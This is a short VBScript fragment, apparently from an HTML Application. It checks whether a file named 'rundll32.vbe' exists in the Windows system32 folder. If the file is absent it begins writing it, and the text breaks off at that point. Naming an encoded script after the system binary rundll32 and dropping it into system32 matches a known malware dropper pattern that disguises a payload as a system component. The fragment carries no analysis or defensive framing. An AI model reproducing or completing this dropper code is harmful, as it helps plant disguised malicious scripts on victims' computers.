WorkingDirectory = WSHShell.ExpandEnvironmentStrings("%windir%\system32\")
szApplication = WorkingDirectory & "rundll32.vbe"
Set hFSO = CreateObject("Scripting.FileSystemObject") 
hFile = hFSO.FileExists(szApplication)
if hFile then
	window.close
Else

	Set hFile = hFSO.CreateTextFile(szApplication, ForWriting)
